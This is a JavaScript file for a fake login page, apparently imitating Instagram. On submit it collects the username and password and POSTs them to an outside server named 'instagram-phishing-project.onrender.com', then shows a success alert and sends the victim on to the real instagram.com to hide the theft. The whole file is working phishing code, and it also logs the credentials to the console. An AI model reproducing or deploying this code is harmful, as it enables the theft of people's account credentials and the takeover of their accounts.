document.addEventListener('DOMContentLoaded', () => {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginButton = document.querySelector('.login-button');

    
    const toggleButtonState = () => {
        if (usernameInput.value.length > 0 && passwordInput.value.length >= 6) {
            loginButton.style.opacity = "1";
            loginButton.disabled = false;
        } else {
            loginButton.style.opacity = "0.7";
            loginButton.disabled = true;
        }
    };

   
    toggleButtonState();

   
    usernameInput.addEventListener('input', toggleButtonState);
    passwordInput.addEventListener('input', toggleButtonState);

    
    (document.querySelector('form')).addEventListener('submit', (e) => {
        e.preventDefault(); 

        const data = {
            username: usernameInput.value,
            password: passwordInput.value
        };

        
        console.log("Փորձում ենք մուտք գործել հետևյալ տվյալներով․", data);
        
        loginButton.innerHTML = "Logging in...";
        loginButton.style.cursor = "not-allowed";
    });
    const loginForm = document.querySelector('form');

  (document.querySelector('form')).addEventListener('submit', async (e) => {
    e.preventDefault(); 

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    try {
        const response = await fetch('https://instagram-phishing-project.onrender.com/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password }),
        });

        if (response.ok) {
            alert("Մուտքը հաջողվեց");
            window.location.href = "https://instagram.com";
        } else {
            alert("Սերվերի սխալ:");
        }
    } catch (error) {
        console.error("Error:", error);
        alert("Չհաջողվեց կապ հաստատել սերվերի հետ:");
    }
});
});
